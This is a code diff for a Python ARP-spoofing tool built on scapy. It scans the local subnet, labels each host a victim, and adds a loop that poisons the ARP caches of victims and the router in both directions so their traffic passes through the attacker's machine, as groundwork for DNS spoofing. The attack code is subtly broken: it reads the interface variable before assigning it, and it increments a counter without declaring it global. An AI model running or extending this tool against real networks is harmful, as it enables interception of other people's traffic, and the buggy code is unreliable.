@@ -66,7 +66,19 @@ def arp_main(silent, manual, router, input_iface):
             time.sleep(2)
 
 
-def arp_main_automated(silent = False, iface = "enp0s10") :
+
+
+
+
+#Methods used for dns spoofing, automated was intended to be used for arp spoofing, but threading hurts as cli doesnt allow quitting with threading
+victim_addresses = []
+router_ip = None
+iface = None
+sent_packets_count = 0 
+
+def arp_main_automated(silent = False, iface_ = "enp0s10") :
+    global victim_addresses, router_ip, iface, sent_packets_count
+    
     current_ip = scapy.get_if_addr(iface)
     subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
     router_ip = current_ip.rsplit('.', 1)[0] + '.1' #usually router is at subnet .1
@@ -81,7 +93,19 @@ def arp_main_automated(silent = False, iface = "enp0s10") :
             victims.append(ip)
 
     victims.remove(current_ip)
+    
+    victim_addresses = victims
+    iface = iface_
     print("Victims: ", str(victims))
 
-    arp_main(silent, victims, router_ip, iface)
+    #arp_main(silent, victims, router_ip, iface)
+
+def arp_tick():
+    for victim_ip in victim_addresses:
+            sent_packets_count += 2
+            arp_spoof(victim_ip, router_ip)
+            arp_spoof(router_ip, victim_ip)
+            sys.stdout.write("[+] Packets sent " + str(sent_packets_count) + "\r")
+            sys.stdout.flush()
+            time.sleep(2)
 
